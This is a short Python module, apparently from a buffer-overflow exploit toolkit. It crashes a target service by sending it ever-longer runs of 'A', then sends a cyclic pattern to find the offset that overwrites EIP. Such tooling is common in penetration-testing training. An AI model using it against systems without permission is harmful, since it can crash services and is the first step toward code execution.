#!/usr/bin/python3

from time import sleep
from send_request import Send
from create_pattern import Pattern


class Fuzz:

    def __init__(self, target):
        self.TARGET = target

    def find_crash(self, fuzz_len):

        buffer = "A" * fuzz_len
        s = Send(self.TARGET)

        while True:
            try:
                s.send_payload(buffer)
                sleep(1)
                buffer = buffer + "A" * fuzz_len
            except:
                return len(buffer)

    def locate_eip(self, pattern='', length=0):
        s = Send(self.TARGET)
        if length > 0:
            pat = Pattern()
            pattern = pat.create_pattern(length)
        try:
            s.send_payload(pattern)
        except Exception as e:
            print(str(e))
            print("Program crashed...")